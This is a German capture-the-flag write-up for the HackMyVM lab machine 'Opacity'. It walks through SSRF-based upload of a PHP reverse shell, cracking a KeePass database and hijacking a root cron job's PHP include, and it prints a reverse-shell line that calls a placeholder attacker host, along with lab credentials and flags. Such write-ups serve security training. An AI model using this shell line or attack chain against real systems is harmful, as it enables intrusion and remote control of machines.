# Opacity - HackMyVM (Medium)

![Opacity.png](Opacity.png)

## Übersicht

*   **VM:** Opacity
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Opacity)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 25. April 2023
*   **Original-Writeup:** https://alientec1908.github.io/Opacity_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Opacity" zu erlangen. Der initiale Zugriff erfolgte durch Ausnutzung einer Server-Side Request Forgery (SSRF)-Schwachstelle in einer Webanwendung (`/cloud/storage.php`), die nach einem Login (`admin:oncloud9` - Credentials im Quellcode von `login.php` gefunden) zugänglich war. Dies ermöglichte das Hochladen einer PHP-Reverse-Shell und somit eine Shell als `www-data`. Die erste Rechteausweitung zum Benutzer `sysadmin` gelang durch das Finden einer KeePass-Datenbankdatei (`/opt/dataset.kdbx`), deren Master-Passwort geknackt wurde und das SSH-Passwort für `sysadmin` enthielt. Die finale Eskalation zu Root erfolgte durch Modifikation einer PHP-Include-Datei (`/home/sysadmin/scripts/lib/backup.inc.php`), die von einem als Root laufenden Cronjob-Skript (`/home/sysadmin/scripts/script.php`) eingebunden wurde. Durch Einfügen eines PHP-Reverse-Shell-Codes in die Include-Datei wurde eine Root-Shell erlangt.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `enum4linux`
*   `gobuster`
*   `python3 http.server`
*   `nc` (netcat)
*   `wget`
*   `keepass2john`
*   `john`
*   `keepass` (oder KeePassXC)
*   `ssh`
*   `unzip`
*   Standard Linux-Befehle (`vi`, `cat`, `ss`, `find`, `ls`, `nano`, `id`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Opacity" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.138) mit `arp-scan` identifiziert. Hostname `opacity.hmv` in `/etc/hosts` eingetragen.
    *   `nmap`-Scan offenbarte Port 22 (SSH, OpenSSH 8.2p1), 80 (HTTP, Apache 2.4.41, Weiterleitung zu `login.php`), 139/445 (SMB, Samba 4.6.2).
    *   `enum4linux` fand den Benutzer `sysadmin`.
    *   `gobuster` auf Port 80 fand u.a. `login.php` und das Verzeichnis `/cloud/`.
    *   Der Quellcode von `/var/www/html/login.php` (nach späterem Shell-Zugriff ausgelesen) enthielt hardcodierte Credentials: `admin:oncloud9`.

2.  **Initial Access (SSRF zu RCE als `www-data`):**
    *   Nach dem Login als `admin:oncloud9` wurde die Funktionalität unter `/cloud/storage.php` untersucht. Diese erlaubte das Abrufen von Dateien von externen URLs (SSRF).
    *   Eine PHP-Reverse-Shell (`rev.php`) wurde auf dem Angreifer-Server gehostet.
    *   Mittels SSRF wurde die `rev.php` vom Zielserver heruntergeladen (als `rev.php .jpg` getarnt) und im Verzeichnis `/cloud/images/` gespeichert.
    *   Durch direkten Aufruf von `http://opacity.hmv/cloud/images/rev.php` wurde die Shell ausgeführt.
    *   Eine Reverse Shell als `www-data` wurde auf einem Netcat-Listener empfangen und stabilisiert.

3.  **Privilege Escalation (von `www-data` zu `sysadmin` via KeePass):**
    *   Als `www-data` wurde im Verzeichnis `/opt` die Datei `dataset.kdbx` (KeePass-Datenbank) gefunden, die `sysadmin` gehörte, aber für `www-data` lesbar war.
    *   Die Datei wurde heruntergeladen. Mittels `keepass2john dataset.kdbx > hash` wurde der Master-Passwort-Hash extrahiert.
    *   `john --wordlist=rockyou.txt hash` knackte das Master-Passwort: `741852963`.
    *   Die KeePass-Datenbank wurde mit dem Master-Passwort geöffnet und enthielt das SSH-Passwort für `sysadmin`: `Cl0udP4ss40p4city#8700`.
    *   Erfolgreicher SSH-Login als `sysadmin`.
    *   Die User-Flag (`6661b61b44d234d230d06bf5b3c075e2`) wurde in `/home/sysadmin/local.txt` gefunden.

4.  **Privilege Escalation (von `sysadmin` zu `root` via Cronjob & PHP Include Hijack):**
    *   `sudo -l` als `sysadmin` zeigte keine `sudo`-Rechte.
    *   Im Verzeichnis `/home/sysadmin/scripts/` wurde die Datei `script.php` (gehört `root:sysadmin`, nur lesbar für `sysadmin`) gefunden. Dieses Skript bindet `lib/backup.inc.php` ein und erstellt ein Backup. Es wurde angenommen, dass `script.php` durch einen Cronjob als `root` ausgeführt wird.
    *   Das Backup-Archiv `/var/backups/backup.zip` wurde in `/home/sysadmin/scripts/` entpackt, wodurch `lib/backup.inc.php` überschrieben werden konnte (da `sysadmin` Schreibrechte im `lib`-Unterverzeichnis hatte).
    *   PHP-Code für eine Reverse Shell (`$sock=fsockopen("ANGRIFFS_IP",9008);exec("/bin/bash <&3 >&3 2>&3");`) wurde in `/home/sysadmin/scripts/lib/backup.inc.php` eingefügt.
    *   Ein Netcat-Listener wurde auf Port 9008 gestartet.
    *   Nachdem der Cronjob `script.php` (und damit die modifizierte `backup.inc.php`) als `root` ausgeführt hatte, wurde eine Root-Shell auf dem Listener empfangen.
    *   Die Root-Flag (`ac0d56f93202dd57dcb2498c739fd20e`) wurde in `/root/proof.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Hardcodierte Credentials im Quellcode:** Zugangsdaten für den Web-Admin (`admin:oncloud9`) waren in `login.php` hinterlegt.
*   **Server-Side Request Forgery (SSRF):** Die Datei `storage.php` erlaubte das Abrufen externer Dateien, was zum Hochladen einer Webshell missbraucht wurde.
*   **Unsicherer Dateiupload:** Nach dem SSRF konnten PHP-Dateien im Web-Root gespeichert und ausgeführt werden.
*   **Exponierte KeePass-Datenbank:** Eine KeePass-Datei mit einem schwachen Master-Passwort enthielt SSH-Credentials.
*   **Passwort-Cracking (KeePass):** Das KeePass-Master-Passwort wurde mit `keepass2john` und `john` geknackt.
*   **Unsichere Dateiberechtigungen / PHP Include Hijacking:** Ein als Root laufender Cronjob führte ein PHP-Skript aus, das eine von einem Benutzer mit geringeren Rechten beschreibbare Datei (`backup.inc.php`) einband. Durch Modifikation dieser Include-Datei konnte Code als Root ausgeführt werden.

## Flags

*   **User Flag (`/home/sysadmin/local.txt`):** `6661b61b44d234d230d06bf5b3c075e2`
*   **Root Flag (`/root/proof.txt`):** `ac0d56f93202dd57dcb2498c739fd20e`

## Tags

`HackMyVM`, `Opacity`, `Medium`, `SSRF`, `File Upload RCE`, `Hardcoded Credentials`, `KeePass`, `Password Cracking`, `Cronjob Exploit`, `PHP Include Hijack`, `Linux`, `Web`, `Privilege Escalation`, `Apache`, `Samba`
